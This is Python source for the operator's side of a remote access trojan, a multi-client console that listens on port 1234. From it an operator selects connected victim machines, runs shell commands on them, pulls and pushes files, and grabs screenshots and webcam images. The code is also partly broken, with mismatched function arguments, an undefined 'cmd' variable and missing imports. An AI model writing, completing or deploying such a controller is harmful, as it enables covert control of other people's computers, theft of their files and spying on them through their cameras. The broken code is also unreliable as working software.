import socket
import threading
from queue import Queue

connections = []
addresses = []
names = []
TASKS = [1,2]
THREADS = 2
queue = Queue()
HOST = ''
PORT = 1234

def transfer(c):
    destination = input("Enter the destination location: ")
    f = open(destination, "wb")
    while True:
        bits = c.recv(1024)
        # DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042 is the hash of the string "this is the end of file"
        if b'DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042' in bits:
            bits = bits[0:-64]
            f.write(bits)
            break
        f.write(bits)
    print("[+] Transfer Complete")
    f.close()

def upload(c):
    filename = cmd.split("*")[1]
    f = open(filename,'rb')
    while True:
        bits = f.read(1024)
        c.send(bits)
        if bits == b'':
            c.send('DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042'.encode())
            break
    f.close()
    print("[+] Transfer Complete")

def cat(c):
    print("\n-----------------" + cmd.split("*")[1] + "-----------------\n")
    while True:
        bits = c.recv(1024)
        if b'DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042' in bits:
            temp = bits[0:-64]
            bits = temp
            print(bits.decode())
            break
        print(bits.decode())
    print("\n-----------------EOF-----------------\n")

def screenshot(c):
    destination = "Screenshots\\" + str(date.today()) + "_" +str(datetime.now().strftime("%H_%M_%S")) +".png"
    f = open(destination, "wb")
    while True:
        bits = c.recv(1024)
        # DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042 is the hash of the string "this is the end of file"
        if b'DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042' in bits:
            bits = bits[0:-64]
            f.write(bits)
            break
        f.write(bits)
    print("[+] Transfer Complete")
    f.close()

def webcam(c):
    destination = "Images\\" + str(date.today()) + "_" +str(datetime.now().strftime("%H_%M_%S")) +".png"
    f = open(destination, "wb")
    while True:
        bits = c.recv(1024)
        # DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042 is the hash of the string "this is the end of file"
        if b'DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042' in bits:
            bits = bits[0:-64]
            f.write(bits)
            break
        f.write(bits)
    print("[+] Transfer Complete")
    f.close()

def create_socket_and_bind():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(5)

def accept_connection():
    for conn in connections:
        conn.close()
    del connections[:]
    del addresses[:]
    del names[:]
    while True:
        try:
            conn, addr = s.accept()
            #name = conn.recv(1024).deoce()
            #print(name)
            conn.setblocking(1)
            connections.append(conn)
            addresses.append(addr)
            #names.append(name)
            name = conn.recv(1024).decode()
            names.append(name)
            print("\n[+] Got connection from ", addr[0],'   ',name,"\n")
        except:
            print("Error excepting connections")

def list_all_connections():
    print("\n----> Connections <----")
    for i,conn in enumerate(connections):
        try:
            conn.send(" ".encode())
            print(i,'   ', addresses[i][0],'   ', addresses[i][1],'   ',names[i], "\n")
        except:
            del connections[i]
            del addresses[i]
            del names[i]

def connect(c):
    c.send('start'.encode())
    shell = c.recv(1024).decode() + ">"
    user = c.recv(1024).decode()
    print("\n[+] Connected to ", user,"\n")
    while True:
        try:
            cmd = input(shell)
            if 'get*' in cmd:
                transfer(c, cmd)
                continue
            elif 'upload*' in cmd:
                upload(c,cmd)
                continue
            elif 'exit' in cmd:
                c.send(cmd.encode())
                break
            elif 'cat*' in cmd:
                c.send(cmd.encode())
                cat(c)
                continue
            elif cmd == 'ss':
                c.send(cmd.encode())
                screenshot(c)
                continue
            elif cmd == 'webcam':
                c.send(cmd.encode())
                webcam(c)
                continue
            c.send(cmd.encode())
            shell = c.recv(1024).decode()
            print(c.recv(10240).decode())
        except:
            print("Connection was lost!")
            break

def start():
    while True:
        cmd = input("alpha> ")
        if cmd == 'list':
            list_all_connections()
        elif 'select' in cmd:
            conn = set_target(cmd)
            if conn is not None:
                connect(conn)
                continue
        elif 'shutdown' == cmd:
            print("Shutting down server! ")
            queue.task_done()
            queue.task_done()
            break
        else:
            print("Invalid Command!")

def set_target(cmd):
    try:
        target = int(cmd.split(" ")[1])
        return connections[target]
    except:
        return None

def create_threads():
    for _ in range(THREADS):
        t = threading.Thread(target = tasks)
        t.daemon = True
        t.start()

def tasks():
    while True:
        x = queue.get()
        if x == 1:
            create_socket_and_bind()
            accept_connection()
        elif x == 2:
            start()
        queue.task_done()

def create_tasks():
    for x in TASKS:
        queue.put(x)
    queue.join()
    return

def main():
    create_threads()
    create_tasks()
if __name__ == '__main__':
    main()
